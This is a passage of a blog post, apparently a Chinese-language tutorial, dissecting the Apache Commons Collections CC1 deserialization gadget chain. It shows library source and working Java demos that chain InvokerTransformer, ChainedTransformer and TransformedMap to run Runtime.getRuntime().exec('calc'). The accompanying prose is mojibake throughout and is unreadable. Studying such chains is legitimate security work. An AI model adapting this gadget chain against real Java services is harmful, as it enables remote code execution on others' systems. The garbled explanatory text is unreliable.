</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iParamTypes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iArgs</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NoSuchMethodException</span><span class="w"> </span><span class="n">var5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; on &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; does not exist&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="n">var6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; on &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; cannot be accessed&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationTargetException</span><span class="w"> </span><span class="n">var7</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="s">&#34;InvokerTransformer: The method &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; on &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; threw an exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var7</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÈáçÁÇπÂ∞±ÊòØtryÈÉ®ÂàÜ‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iParamTypes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iArgs</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáå‰ΩøÁî®ÂèçÂ∞ÑËé∑ÂèñÊñπÊ≥ïÂπ∂‰ΩøÁî®invoke()ÊñπÊ≥ïË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÁúãÁúãËøôÈáåÈúÄË¶ÅÂà©Áî®ÁöÑÂá†‰∏™ÂèÇÊï∞Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">iMethodName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">iParamTypes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">iArgs</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËµãÂÄºÊñπÊ≥ï‰πüÂú®ÊûÑÈÄ†ÂáΩÊï∞ÈáåÈù¢ÔºåÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">methodName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iParamTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iArgs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞ùËØïËá™Â∑±ÊûÑÈÄ†ÔºåÊµãËØï‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫Ôºö
<img src="/p/cc1/image-20240717101316796.png"
	width="1161"
	height="427"
	srcset="/p/cc1/image-20240717101316796_hu5188139651935283937.png 480w, /p/cc1/image-20240717101316796_hu3414571070308473827.png 1024w"
	loading="lazy"
	
		alt="image-20240717101316796"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="652px"
	
></p>
<h5 id="chainedtransformer">ChainedTransformer
</h5><p><code>org.apache.commons.collections.functors.ChainedTransformer</code>Á±ª‰πüÊòØTransformerÁöÑÂÆûÁé∞Á±ªÔºåÂÖ≥ÈîÆÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="nf">ChainedTransformer</span><span class="p">(</span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">transformers</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">object</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><u>ËøôÈáåÁöÑÈáçÁÇπÂ∞±ÊòØËøô‰∏™Á±ªËá™Â∑±Áª¥Êä§‰∫Ü‰∏Ä‰∏™TransformerÊï∞ÁªÑÔºåÂú®Ë∞ÉÁî®ChainedTransformerÁöÑtransformÊñπÊ≥ïÊó∂Ôºå‰ºöÂæ™ÁéØÊï∞ÁªÑÔºå‰æùÊ¨°Ë∞ÉÁî® Transformer Êï∞ÁªÑÊØè‰∏™ trandformÊñπÊ≥ïÔºåÂπ∂Â∞ÜÁªìÊûú‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™ Transformer„ÄÇ</u></p>
<p>ËøôÊ†∑Â∞±Áªô‰∫Ü‰ΩøÁî®ËÄÖÈìæÂºèË∞ÉÁî®Â§ö‰∏™ Transformer ÂàÜÂà´Â§ÑÁêÜÂØπË±°ÁöÑËÉΩÂäõ„ÄÇ</p>
<h5 id="constanttransformer">ConstantTransformer
</h5><p><code>org.apache.commons.collections.functors.ConstantTransformer</code>ÊòØËøîÂõû‰∏Ä‰∏™Âõ∫ÂÆöÂ∏∏ÈáèÁöÑTransformerÔºåÂú®ÂàùÂßãÂåñÊó∂ÂÇ®Â≠ò‰∫Ü‰∏Ä‰∏™ObjectÔºåÂêéÁª≠ÁöÑË∞ÉÁî®‰ºöÁõ¥Êé•ËøîÂõûËøô‰∏™Object„ÄÇÂÖ≥ÈîÆÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">ConstantTransformer</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iConstant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iConstant</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏™Á±ªÁî®‰∫éÂíåChainedTransformerÈÖçÂêàÔºåÂ∞ÜÂÖ∂ÁªìÊûú‰º†ÂÖ•InvokerTransformerÊù•Ë∞ÉÁî®Êàë‰ª¨ÊåáÂÆöÁöÑÁ±ªÁöÑÊåáÂÆöÊñπÊ≥ï„ÄÇ</p>
<h4 id="ÊîªÂáªÊûÑÈÄ†">ÊîªÂáªÊûÑÈÄ†
</h4><p>CC1ËøôÈáåÊúâ‰∏§Êù°ÈìæÂèØ‰ª•Âà©Áî®ÔºåÂàÜÂà´ÊòØÂà©Áî®TransformedMapÁ±ªÂíåLazyMapÁ±ªÔºåÁé∞Âú®Êù•ÂàÜÂà´ËØ¥Êòé‰∏Ä‰∏ã„ÄÇ</p>
<h5 id="transformedmapÈìæ">TransformedMapÈìæ
</h5><h6 id="Âü∫Êú¨Êú¨Âú∞‰ª£Á†Å">Âü∫Êú¨Êú¨Âú∞‰ª£Á†Å
</h6><p>ËøôÈáåÂ∞±ÁªìÂêàÂà∞ÂâçÈù¢Áü•ËØÜÁÇπÔºåÊù•ÊûÑÈÄ†ÂèçÂ∫èÂàóÂåñÁöÑÊÅ∂ÊÑèÂà©Áî®‰ª£Á†Å„ÄÇÁé∞Âú®Êàë‰ª¨ÊûÑÈÄ†ÁöÑÊúÄÁªàÁöÑÂà©Áî®ÁÇπÔºåÂ∞±ÊòØ<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ÔºåÂú®ËøôÈáå‰ΩøÁî®TransformedMap Ëß¶ÂèëÔºåÊú¨Âú∞demoÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">                                                             </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">10</span><span class="p">,</span><span class="s">&#34;xxx&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËØ¥Êòé‰∏Ä‰∏ãËøô‰∏≤‰ª£Á†ÅÁöÑ‰ΩúÁî®ÔºåÂÖàËØ¥ÂêéÈù¢ÁöÑÂà©Áî®‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">10</span><span class="p">,</span><span class="s">&#34;xxx&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈÉ®ÂàÜ‰ª£Á†ÅÂè™Ë¶ÅÁêÜËß£Âà∞‰∫ÜÂâçÈù¢Âú®TransformedMapÁ±ªÈÉ®ÂàÜÁªôÁöÑÁ§∫‰æã‰ª£Á†ÅÂü∫Êú¨Â∞±ÂèØ‰ª•ÁêÜËß£‰∫Ü„ÄÇÊâÄ‰ª•ÈìæÂ≠êËµ∑ÂßãÁÇπÂ∞±ÊòØ</p>
<p><img src="/p/cc1/image-20240720144155815.png"
	width="973"
	height="99"
	srcset="/p/cc1/image-20240720144155815_hu6452416412692743849.png 480w, /p/cc1/image-20240720144155815_hu10291756103348548711.png 1024w"
	loading="lazy"
	
		alt="image-20240720144155815"
	
	
		class="gallery-image" 
		data-flex-grow="982"
		data-flex-basis="2358px"
	
></p>
<p>Áé∞Âú®Êù•ÁúãÊµÅÁ®ãÔºåÊâìÊñ≠ÁÇπÂ¶Ç‰∏ãÔºö</p>
<p><img src="/p/cc1/image-20240720144236280.png"
	width="979"
	height="92"
	srcset="/p/cc1/image-20240720144236280_hu17190731847262359541.png 480w, /p/cc1/image-20240720144236280_hu14610213967137982077.png 1024w"
	loading="lazy"
	
		alt="image-20240720144236280"
	
	
		class="gallery-image" 
		data-flex-grow="1064"
		data-flex-basis="2553px"
	
></p>
<p>ÁÑ∂ÂêéÂ∞±ÁªßÁª≠Ë∑üËøõÔºåÁî±‰∫éÊàë‰ª¨‰º†ÂÖ•ÁöÑkeyTransformerÂ∞±ÊòØChainedTransformerÁ±ªÂØπË±°ÔºåÊâÄ‰ª•ËøôÈáåË∞ÉÁî®ÁöÑ<code>transform()</code>ÊñπÊ≥ïÊó∂ÔºåË∞ÉÁî®ÁöÑÂ∞±ÊòØChainedTransformerÁ±ªÁöÑtransform()ÊñπÊ≥ïÔºåÂ¶Ç‰∏ãÔºö</p>
